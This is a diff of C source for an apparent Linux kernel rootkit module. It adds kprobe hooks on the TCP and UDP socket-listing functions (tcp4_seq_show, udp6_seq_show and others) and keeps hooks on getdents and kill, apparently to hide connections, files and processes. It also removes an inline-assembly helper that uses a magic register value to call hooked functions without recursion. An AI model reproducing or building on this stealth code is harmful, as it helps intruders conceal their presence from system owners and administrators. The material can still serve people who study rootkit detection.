@@ -3,15 +3,19 @@
 
 #include <linux/kprobes.h>
 #include <linux/module.h>
-#include <linux/syscalls.h>
 
 struct hook {
-  syscall_t *func;  // hook function
+  void *func;  // hook function
   struct kprobe kp; // kprobe hook
 };
 
 struct hook hooks[] = {
-    {.func = h_getdents64, .kp = {.symbol_name = "__x64_sys_getdents64"}},
+    {.func = h_tcp4_seq_show, .kp = {.symbol_name = "tcp4_seq_show"}},
+    {.func = h_tcp6_seq_show, .kp = {.symbol_name = "tcp6_seq_show"}},
+
+    {.func = h_udp4_seq_show, .kp = {.symbol_name = "udp4_seq_show"}},
+    {.func = h_udp6_seq_show, .kp = {.symbol_name = "udp6_seq_show"}},
+
     {.func = h_getdents, .kp = {.symbol_name = "__x64_sys_getdents"}},
     {.func = h_kill, .kp = {.symbol_name = "__x64_sys_kill"}},
     /*{.num = __NR_openat, .name = "openat", .func = h_openat},
@@ -32,15 +36,15 @@ int __hook_pre_handler(struct kprobe *kp, struct pt_regs *r) {
 
   /*
 
-   * here is the problem: if we hook a syscall and call our hook function instead,
-   * when the hook function calls the original syscall function, the kprobe will
+   * here is the problem: if we hook a function and call our hook function instead,
+   * when the hook function calls the original function, the kprobe will
    * be triggered again, so we will trigger our hook again, which will trigger the
    * kprobe again... so an infinite loop, we will just hang the current task
 
    * to prevent this, the hooked function sets the r15 register to a special value
-   * which is used verify that the caller is actually our hook function, see hooks_orig_call()
+   * which is used verify that the caller is actually our hook function
 
-   * in this case we'll just singlestep the original syscall, preventing the loop
+   * in this case we'll just singlestep the original hooked function, preventing the loop
 
   */
 
@@ -105,39 +109,7 @@ void hooks_uninstall(void) {
     unregister_kprobe(&hooks[i].kp);
 }
 
-int64_t hooks_orig_call(syscall_t *orig, const struct pt_regs *r) {
-  int64_t ret = 0;
-
-  if (NULL == orig || NULL == r)
-    return -ENOSYS; // this gaslighting aint gonna work :skull:
-
-  // clang-format off
-
-  /*
-
-   * we could just mov $SHRK_MAGIC_R15 %r15 and return orig(r)
-   * and call it a day but compiler may modify r15 after the asm call
-   * so just to make sure the r15 is %100 set we'll do the call in asm
-   * as well
-
-   * also at&t syntax is cringe (thats why ken came up with c)
-
-  */
-
-  // clang-format on
-
-  asm("mov %1, %%r15;"
-      "mov %2, %%rdi;"
-      "call *%3;"
-      "mov %%rax, %0"
-      : "=m"(ret)
-      : "i"(SHRK_MAGIC_R15), "rm"(r), "m"(orig)
-      : "%r15", "%rdi", "%rax");
-
-  return ret;
-}
-
-void *hooks_orig_find(const char *symbol) {
+void *hooks_find(const char *symbol) {
   uint8_t i = 0;
 
   for (; i < hook_count(); i++) {
